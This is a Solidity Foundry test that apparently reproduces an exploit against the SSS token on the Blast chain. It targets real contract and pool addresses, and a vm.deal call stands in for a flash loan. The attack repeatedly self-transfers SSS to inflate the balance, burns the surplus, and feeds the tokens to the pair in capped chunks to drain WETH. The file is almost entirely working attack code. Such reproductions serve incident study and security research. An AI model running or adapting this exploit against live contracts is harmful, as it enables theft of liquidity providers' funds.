// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IWETH9.sol";

import "./ISSS.sol";

address constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
WETH9 constant WETH = WETH9(
    payable(0x4300000000000000000000000000000000000004)
);
ISSS constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
IUniswapV2Router constant ROUTER_V2 = IUniswapV2Router(
    0x98994a9A7a2570367554589189dC9772241650f6
);
IUniswapV2Pair constant sssPool = IUniswapV2Pair(POOL);

contract SSSExploit is Test {
    uint256 ethFlashAmt = 1 ether;

    function setUp() public {
        vm.createSelectFork("blast", 1111439 - 1);

        //Emulate flashloan here with deal
        vm.deal(address(this), 0);
        vm.deal(address(this), ethFlashAmt);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function getPath(bool buy) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = buy ? address(WETH) : address(SSS);
        path[1] = buy ? address(SSS) : address(WETH);
    }

    function testExploit() public {
        print("WETH balance before", WETH.balanceOf(address(this)), 18);

        WETH.approve(address(ROUTER_V2), type(uint256).max);
        SSS.approve(address(ROUTER_V2), type(uint256).max);

        WETH.deposit{value: ethFlashAmt}();

        //Buy 1 eth of tokens
        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ethFlashAmt,
            0,
            getPath(true),
            address(this),
            block.timestamp
        );

        // Transfer to self until balance reaches target bal
        uint256 targetBal = ROUTER_V2.getAmountsIn(
            WETH.balanceOf(POOL) - 29.5 ether,
            getPath(false)
        )[0];
        while (SSS.balanceOf(address(this)) < targetBal) {
            SSS.transfer(address(this), SSS.balanceOf(address(this)));
        }

        // Burn excess tokens above target to avoid OVERFLOW error on swap on pair
        SSS.burn(SSS.balanceOf(address(this)) - targetBal);
        // assertEq(SSS.balanceOf(address(this)), targetBal, "we exceeded target");

        //Send balance of tokens to pair to swap in a loop,to avoid multiple swap calls
        uint256 tokensLeft = targetBal;
        uint256 maxAmountPerTx = SSS.maxAmountPerTx();
        uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);
        while (tokensLeft > 0) {
            uint256 toSell = tokensLeft > maxAmountPerTx
                ? maxAmountPerTx - 1
                : tokensLeft;
            SSS.transfer(POOL, toSell);
            tokensLeft -= toSell;
        }

        //Use swap function in pool to swap to weth
        uint256 targetETH = ROUTER_V2.getAmountsOut(
            SSS.balanceOf(POOL) - SBalBeforeOnPair,
            getPath(false)
        )[1];
        sssPool.swap(targetETH, 0, address(this), new bytes(0));

        // Emulate paying back flashloan
        WETH.transfer(address(1), ethFlashAmt);

        print("WETH balance after", WETH.balanceOf(address(this)), 18);
    }
}
